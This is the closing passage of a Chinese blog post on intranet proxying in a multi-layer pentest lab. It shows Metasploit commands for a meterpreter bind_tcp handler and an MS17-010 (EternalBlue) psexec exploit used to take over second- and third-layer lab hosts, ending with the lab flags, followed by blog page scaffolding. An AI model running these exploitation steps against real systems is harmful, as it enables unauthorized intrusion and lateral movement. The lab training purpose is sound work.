+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面# proxychains msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>然后配置监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 1234</span><br><span class="line">msf5 exploit(multi/handler) &gt; set rhost 192.168.239.129</span><br></pre></td></tr></table></figure>
+
+<p> 执行木马即可拿下第二层主机服务器权限</p>
+<p><img src="/assets/15-20220124094501-ysyjb8v.png" alt="15.png"></p>
+<p>拿下第二层之后，之后操作大同小异，添加路由，探测第三层存活主机，发现192.168.154.129的ip，然后该台机器存在永恒之蓝漏洞，利用ms17-010拿下第三层权限</p>
+<p>msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</p>
+<p>msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</p>
+<p><img src="/assets/16-20220124094509-e9m91us.png" alt="16.png"></p>
+<p>至此三个靶机中的flag都可以找到。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://suifeng-kali.github.io">随风</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://suifeng-kali.github.io/2023/05/08/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/">http://suifeng-kali.github.io/2023/05/08/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://suifeng-kali.github.io" target="_blank">随风</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E4%BB%A3%E7%90%86/">渗透代理</a></div><div class="post_share"><div class="social-share" data-image="/assets/5-20220124093627-0vj5ugg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/05/06/CommonCollections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="CommonCollections2反序列化链分析"><img class="cover" src="/assets/image-20230505182336-va124jl.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CommonCollections2反序列化链分析</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://suifeng-kali.github.io/img/logo.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">随风</div><div class="author-info__description">记录与分享</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" href="/img/gzh.png"><i class="fa-brands fa-weixin"></i><span>关注我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/suifeng-kali" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/img/vx.jpg" target="_blank" title="VX"><i class="fa-brands fa-weixin" style="color: #1BCB53;"></i></a><a class="social-icon" href="https://space.bilibili.com/266524390?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="fa-brands fa-bilibili" style="color: #F75887;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">在这分享分享自己的笔记，记录记录生活。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BA%92%E9%80%9A%E7%8A%B6%E5%86%B5"><span class="toc-number">2.1.</span> <span class="toc-text">网络互通状况</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF"><span class="toc-number">3.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NPS%E4%BB%A3%E7%90%86%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">NPS代理攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">多级代理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-number">5.1.</span> <span class="toc-text">环境搭建</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/05/08/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/" title="内网代理技术"><img src="/assets/5-20220124093627-0vj5ugg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网代理技术"/></a><div class="content"><a class="title" href="/2023/05/08/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/" title="内网代理技术">内网代理技术</a><time datetime="2023-05-08T07:47:00.000Z" title="发表于 2023-05-08 15:47:00">2023-05-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/06/CommonCollections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="CommonCollections2反序列化链分析"><img src="/assets/image-20230505182336-va124jl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CommonCollections2反序列化链分析"/></a><div class="content"><a class="title" href="/2023/05/06/CommonCollections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="CommonCollections2反序列化链分析">CommonCollections2反序列化链分析</a><time datetime="2023-05-06T11:55:00.000Z" title="发表于 2023-05-06 19:55:00">2023-05-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/06/JVM/" title="JVM"><img src="/assets/image-20230426172634-r0en2rc.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JVM"/></a><div class="content"><a class="title" href="/2023/05/06/JVM/" title="JVM">JVM</a><time datetime="2023-05-06T11:26:00.000Z" title="发表于 2023-05-06 19:26:00">2023-05-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/05/%E5%8A%A8%E6%80%81%E5%AD%97%E8%8A%82%E7%A0%81/" title="动态字节码"><img src="/assets/image-20230505135209-yjwy1j6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="动态字节码"/></a><div class="content"><a class="title" href="/2023/05/05/%E5%8A%A8%E6%80%81%E5%AD%97%E8%8A%82%E7%A0%81/" title="动态字节码">动态字节码</a><time datetime="2023-05-05T06:18:00.000Z" title="发表于 2023-05-05 14:18:00">2023-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/02/CommonCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="CommonCollections1反序列化链分析"><img src="/assets/image-20230502111639-lmpw1qk.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CommonCollections1反序列化链分析"/></a><div class="content"><a class="title" href="/2023/05/02/CommonCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="CommonCollections1反序列化链分析">CommonCollections1反序列化链分析</a><time datetime="2023-05-02T03:38:00.000Z" title="发表于 2023-05-02 11:38:00">2023-05-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: black"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 随风</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'SB4PGikNZrP3JAMCBJNWM9eC-gzGzoHsz',
+      appKey: 'DIgUpJL30T7a2KTMRAWkD2Zq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU,RedTeam,POC,EXP,Payload,SQLi,XSS,CSRF,XXE,Hack,Security,Sqlmap,Nmap,BurpSuite,Java,Python,Web,RCE,Root,Id,Whoami,CobaltStrike,Metasploit" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
